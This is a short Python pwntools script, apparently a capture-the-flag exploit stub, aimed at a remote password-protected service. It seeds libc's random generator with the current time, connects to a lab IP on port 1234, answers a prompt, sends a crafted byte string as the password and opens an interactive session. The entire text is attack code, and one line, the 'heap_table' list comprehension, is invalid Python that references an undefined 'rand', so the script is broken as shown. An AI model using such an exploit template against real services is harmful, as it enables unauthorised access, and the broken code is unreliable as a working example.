from pwn import *
from ctypes import *

clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
clib.srand(clib.time(0))
heap_table = [x for i,x in range(0,100), rand()]
HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
s.recvuntil('(yes/no)?')
s.sendline('yes')
s.recvuntil('password:')
s.sendline('Q\x01\x01\x01\x01\x01\x01\x02\x05')
s.interactive()
